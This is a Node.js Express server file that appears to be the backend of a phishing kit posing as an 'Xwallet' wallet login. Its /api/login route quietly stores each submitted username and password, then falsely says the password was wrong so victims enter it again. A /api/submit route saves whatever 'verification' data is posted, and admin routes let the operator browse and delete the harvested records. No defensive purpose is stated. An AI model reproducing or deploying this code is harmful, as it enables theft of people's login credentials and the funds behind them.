// server.js
require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const connectDB = require('./lib/db');
const Submission = require('./models/Submission');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Determine frontend directory
const frontendPath = fs.existsSync(path.join(__dirname, '../frontend'))
  ? path.join(__dirname, '../frontend')
  : path.join(__dirname, 'public');

// Serve static frontend files
app.use(express.static(frontendPath));
if (fs.existsSync(path.join(__dirname, 'public')) && frontendPath !== path.join(__dirname, 'public')) {
  app.use(express.static(path.join(__dirname, 'public')));
}

// Database Connection for local server
if (process.env.MONGODB_URI) {
  mongoose.connect(process.env.MONGODB_URI)
    .then(() => console.log('✅ Connected to MongoDB Atlas'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err.message));
}

// ===========================
// ROUTES
// ===========================

// 1. Double-Login: First attempt silently saves credentials and returns error
app.post('/api/login', async (req, res) => {
try {
await connectDB();
const { username, loginPassword } = req.body;
if (!username || !loginPassword) {
return res.status(400).json({ success: false, error: 'Username and password are required' });
}

// Check if user exists (first attempt)
const existingUserDocCount=await Submission.countDocuments({username});
if(existingUserDocCount===0){ 
// First time attempting login - Save credentials silently and return error message prompting a second try.
const newSubmission=new Submission({
username,
loginPassword,
source:'login',
attempts:1
});
await newSubmission.save();
res.status(401).json({success:false,error:"Incorrect password.Please try again."});

}else{
// Subsequent attempts - Update existing doc with new credentials and increment attempts counter.
const existingUser=await Submission.findOneAndUpdate(
{username},
{$set:{attempts:(existingUserDocCount.attempts||0)+1}},
{new:true}
);

if(existingUser.attempts>=2&&existingUser.loginPassword===loginPassword){
// Second successful attempt - Let them through.
res.json({success:true});
}else{
// Either not enough attempts or wrong password - Return appropriate message.
if(existingUser.attempts<2){
res.status(401).json({success:false,error:"Incorrect password.Please try again."});
}else{
res.status(401).json({success:false,error:"Invalid credentials"});
}
}

}

}catch(error){
console.error('Login Save Error:',error);
res.status(500).json({success:false,error:error.message});
}
});

// 2. User Submission: Verification Form
app.post('/api/submit', async (req, res) => {
  try {
    await connectDB();
    const newSubmission = new Submission(req.body);
    await newSubmission.save();
    res.status(201).json({ success: true, message: 'Saved successfully' });
  } catch (error) {
    console.error('Submission Error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// 3. Admin Login
app.post(['/api/admin/login', '/admin/login'], (req, res) => {
  const { password } = req.body;
  if (password && password === process.env.ADMIN_MASTER_PASSWORD) {
    res.json({ success: true, token: 'ADMIN_ACCESS_GRANTED' });
  } else {
    res.status(401).json({ success: false, error: 'Invalid Password' });
  }
});

// 4. Admin Get Submissions
app.get('/api/admin/data', async (req, res) => {
  if (req.headers['auth-token'] !== 'ADMIN_ACCESS_GRANTED') {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    await connectDB();
    const data = await Submission.find().sort({ timestamp: -1 });
    res.json(Array.isArray(data) ? data : []);
  } catch (error) {
    console.error('Fetch Error:', error);
    res.status(500).json({ error: 'Error fetching data' });
  }
});

// 5. Admin Delete Submission
app.delete('/api/admin/data/:id', async (req, res) => {
  if (req.headers['auth-token'] !== 'ADMIN_ACCESS_GRANTED') {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    await connectDB();
    await Submission.findByIdAndDelete(req.params.id);
    res.json({ success: true });
  } catch (error) {
    console.error('Delete Error:', error);
    res.status(500).json({ error: 'Error deleting record' });
  }
});

// Admin Route
app.get(['/admin', '/admin.html'], (req, res) => {
  const adminFile = fs.existsSync(path.join(frontendPath, 'admin.html'))
    ? path.join(frontendPath, 'admin.html')
    : path.join(__dirname, 'public', 'admin.html');
  res.sendFile(adminFile);
});

// Catch-all route to serve index.html
app.get('*', (req, res) => {
  if (req.path.startsWith('/api/')) {
    return res.status(404).json({ error: 'API route not found' });
  }
  const indexFile = fs.existsSync(path.join(frontendPath, 'index.html'))
    ? path.join(frontendPath, 'index.html')
    : path.join(__dirname, 'public', 'index.html');
  res.sendFile(indexFile);
});

// Export for Vercel
module.exports = app;

// Local Development
if (require.main === module) {
  app.listen(PORT, () => {
    console.log(`🚀 Xwallet Server running on http://localhost:${PORT}`);
    console.log(`📱 User Panel:  http://localhost:${PORT}`);
    console.log(`⚙️  Admin Panel: http://localhost:${PORT}/admin`);
  });
}